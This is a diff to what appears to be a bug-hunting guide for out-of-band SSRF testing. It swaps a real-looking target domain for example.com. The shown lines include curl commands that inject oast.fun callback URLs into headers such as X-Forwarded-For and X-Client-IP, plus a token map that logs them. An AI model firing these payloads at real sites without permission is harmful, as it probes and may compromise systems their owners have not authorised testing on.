@@ -69,8 +69,8 @@ token   payload_host   type   target   meta   timestamp
 
 Example lines:
 
-a7d91cfb1203    a7d91cfb1203.oast.fun    PARAM   https://absupplies.chitchats.com/account/login?checkout_url=...   param:url    2025-11-20T12:34:56
-b8e21adc7789    b8e21adc7789.oast.fun    HEADER  absupplies.chitchats.com    HEADER:X-Forwarded-For   2025-11-20T12:35:22
+a7d91cfb1203    a7d91cfb1203.oast.fun    PARAM   https://absupplies.example.com/account/login?checkout_url=...   param:url    2025-11-20T12:34:56
+b8e21adc7789    b8e21adc7789.oast.fun    HEADER  absupplies.example.com    HEADER:X-Forwarded-For   2025-11-20T12:35:22
 
 2) param_tests.txt
 
@@ -163,12 +163,12 @@ fe119cb2d991  fe119cb2d991.oast.fun  PARAM  https://.../mailer-bundles  param:pa
 
 Script sees all endpoints share:
 
-absupplies.chitchats.com
+absupplies.example.com
 
 
 So header fuzzing is done ONLY against:
 
-https://absupplies.chitchats.com
+https://absupplies.example.com
 
 ⭐ STEP 3 — HEADER FUZZING
 
@@ -188,16 +188,16 @@ fae28cd11722 → Destination
 d2f1cab889ff → X-Client-IP
 
 Sends requests:
-curl -H "X-Forwarded-For: http://b8e21adc7789.oast.fun" https://absupplies.chitchats.com
-curl -H "X-Real-IP: http://c99e712fa901.oast.fun" https://absupplies.chitchats.com
-curl -H "Destination: http://fae28cd11722.oast.fun" https://absupplies.chitchats.com
-curl -H "X-Client-IP: http://d2f1cab889ff.oast.fun" https://absupplies.chitchats.com
+curl -H "X-Forwarded-For: http://b8e21adc7789.oast.fun" https://absupplies.example.com
+curl -H "X-Real-IP: http://c99e712fa901.oast.fun" https://absupplies.example.com
+curl -H "Destination: http://fae28cd11722.oast.fun" https://absupplies.example.com
+curl -H "X-Client-IP: http://d2f1cab889ff.oast.fun" https://absupplies.example.com
 
 Added into tokens_map.tsv:
-b8e21adc7789  b8e21adc7789.oast.fun  HEADER  absupplies.chitchats.com  HEADER:X-Forwarded-For
-c99e712fa901  c99e712fa901.oast.fun  HEADER  absupplies.chitchats.com  HEADER:X-Real-IP
-fae28cd11722  fae28cd11722.oast.fun  HEADER  absupplies.chitchats.com  HEADER:Destination
-d2f1cab889ff  d2f1cab889ff.oast.fun  HEADER  absupplies.chitchats.com  HEADER:X-Client-IP
+b8e21adc7789  b8e21adc7789.oast.fun  HEADER  absupplies.example.com  HEADER:X-Forwarded-For
+c99e712fa901  c99e712fa901.oast.fun  HEADER  absupplies.example.com  HEADER:X-Real-IP
+fae28cd11722  fae28cd11722.oast.fun  HEADER  absupplies.example.com  HEADER:Destination
+d2f1cab889ff  d2f1cab889ff.oast.fun  HEADER  absupplies.example.com  HEADER:X-Client-IP
 
 ⭐ STEP 4 — YOU GET AN OOB HIT 😈
 
